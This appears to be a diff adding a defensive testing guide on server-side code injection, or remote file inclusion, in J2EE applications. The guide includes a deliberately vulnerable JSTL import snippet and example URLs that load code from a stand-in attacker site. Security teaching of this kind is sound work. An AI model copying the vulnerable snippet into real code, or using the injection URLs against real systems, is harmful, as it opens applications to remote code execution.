@@ -1,0 +1,57 @@
+<h1>Applies to</h1>
+  <ul>
+    <li>J2EE applications<b></b></li>
+  </ul>
+  <h1>Summary</h1>
+  <p>J2EE applications are hosted by a Web server capable of interpreting and executing server-side code such as Java Server Pages (JSP files) or Java servlets. A server-side code injection bug occurs when an attacker is able to inject additional server-side code that is then interpreted and executed as part of the application’s code; for instance, when an attacker remotely includes a malicious JSP page in a J2EE application. Since the server-side code is executed as part of the application, it has programmatic access to different application resources including user accounts and databases. Attackers can exploit server-side code injection bugs to execute logical attacks on J2EE applications.</p>
+  <p>Follow these steps to test for server-side code injection in J2EE applications:</p>
+  <ul>
+    <li>Step 1: Understand attack scenarios </li>
+    <li>Step 2: Analyze causes and countermeasures </li>
+    <li>Step 3: Execute test cases</li>
+  </ul>
+  <h1>Step 1: Understand attack scenarios</h1>
+  <p>The first step in learning how to test for server-side code injection bugs is to understand the anatomy of a server-side code injection vulnerability in J2EE.</p>
+  <p>It is important to understand the difference between client-side code injection and server-side code injection:</p>
+  <p>Client-side code injection occurs when an attacker uses a vulnerable web application to execute remote code in the client’s browser context. This is why client-side code injection attacks such as cross-site scripting (XSS) as well as AJAX injection attacks are written in JavaScript; the victim client’s browser must be able to interpret the exploit code.</p>
+  <p>Server-side code injection aims at having the application’s web engine (such as ASP, JSP, etc.) interpret and execute the malicious code as part of the application. This means that an attacker who successfully exploits a server-side code injection bug will add an extra application functionality that executes with the same privileges of the application’s code.   </p>
+  <p>J2EE web applications that remotely include source code files, such as JSP pages containing server-side scripts, might be vulnerable to this attack which is also known as Remote File Inclusion (RFI) attack. Consider an application that uses a URL parameter to include a remote file from a trusted site:</p>
+  <pre>http://some_site/example.jsp?includeFile=<strong>http://trusted_site/remote.jsp</strong></pre>
+  <p>A vulnerable J2EE application allows an attacker to tamper with the URL parameter in order to remotely include a malicious source code file:<i></i></p>
+  <pre>http://some_site/example.jsp?includeFile=http://attacker_site/attack.jsp</pre>
+  <p>In detail:</p>
+  <ol>
+    <li>The attacker discovers an application functionality where client supplied input is used as a filename of a remote file inclusion. </li>
+    <li>The attacker passes the name of a remote file, hosted at an attacker-controlled site, and containing malicious code.</li>
+  </ol>
+  <h1>Step 2: Analyze Causes and Countermeasures</h1>
+  <p>The second step in learning how to test for server-side code injection bugs is to understand what causes this attack and how to protect against it.  </p>
+  <p>Server-side code injection in J2EE applications is possible due to improper Remote File Inclusion (RFI).  Even though server-side code injection and Remote File Inclusion (RFI) vulnerabilities are commonly associated with PHP applications, J2EE applications might be also vulnerable to this attack. RFI vulnerabilities are caused because the application’s code fails to properly sanitize and validate client-supplied input and uses it in a remote file inclusion.  </p>
+  <p>Note that J2EE applications that use the <em>&lt;include&gt;</em> or <em>&lt;jsp:include&gt;</em> tags only allow for relative paths so including a remote file is impossible, making them safe against this variation. However, J2EE applications can use the Java Standard Tag Library’s (JSTL) <em>&lt;c:import&gt;</em> tag to include a remote source code file. Consider this code:</p>
+  <pre>&lt;%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %&gt;
+&lt;c:catch var="ex"&gt;
+&lt;c:import url="&lt;%= request.getParameter(\"sourceFile\") %&gt;"/&gt;
+&lt;/c:catch&gt;
+&lt;c:if test="${not empty ex}" &gt;
+Error: &lt;c:out value="message" /&gt;
+&lt;/c:if&gt;</pre>
+  <p>The code above includes a remote file specified by the <em>sourceFile</em> URL parameter, but it directly uses the input in the <em>&lt;c:import&gt; </em>tag without proper input validation. As a result, an attacker can inject malicious server-side code to the application through the <em>sourceFile</em> URL parameter:</p>
+  <pre>http://some_site/example.jsp?<strong>sourceFile</strong>=http://attacker_site/attack.jsp</pre>
+  <p>Depending on the platform in use, it may be possible to use additional RFI methods to the JSTL example above. </p>
+  <p>To protect against this bug, J2EE applications should hide their remote file includes from being accessed by outside clients. If they must use accessible input during remote includes (i.e. URL parameters), they must be sure to properly validate any parameters before during remote file inclusion. Developers are recommended to create a whitelist<em></em>containing a list of the valid remote locations (that can be also implemented as a regular expression). The application must then check that all parameters used in the inclusion appear in the white list and reject any input parameter that is not white-listed.</p>
+  <h1>Step 3: Execute Test Cases</h1>
+  <p>Now that you’ve reviewed the theoretical aspects of server-side code injection bugs in J2EE it is necessary to execute the necessary test cases to check if your application is vulnerable.</p>
+  <h2>
+    <em>Test for Server-side code injection in J2EE</em>
+  </h2>
+  <p>Follow these steps:</p>
+  <ol>
+    <li>Create a proof-of-concept JSP file <i>test.jsp</i>  with the following code: <font face="Courier New">&lt;jsp:text&gt;Application is vulnerable&lt;/jsp:text&gt;</font></li>
+    <li>Host the JSP file above in a test site domain: <font face="Courier New">http://test_site/test.jsp</font></li>
+    <li>Discover a functionality in the application that performs remote file inclusion based on client supplied input. </li>
+    <li>Pass the URL from Step 2 as client input. </li>
+    <li>Observe how the application reacts to the injected code.</li>
+  </ol>
+  <p>Expected results: The application is vulnerable if it includes and executes the JSP page and displays the message <i>Application is vulnerable.</i></p>
+  <h1>Conclusions</h1>
+  <p>Server-side code injection bugs allow attackers to inject code that will be executed by the J2EE engine that hosts the vulnerable application. Attackers can use server-side code injection to execute logical attacks on the target application. To learn how to test for this vulnerability, it is necessary to understand its attack scenario and how it is possible in J2EE applications, as well as how to protect against it. Testing for this bug requires building a small proof-of-concept page, hosting it in a remote location, and passing a URL to the page as input to the application under test while observing how the application reacts.</p>
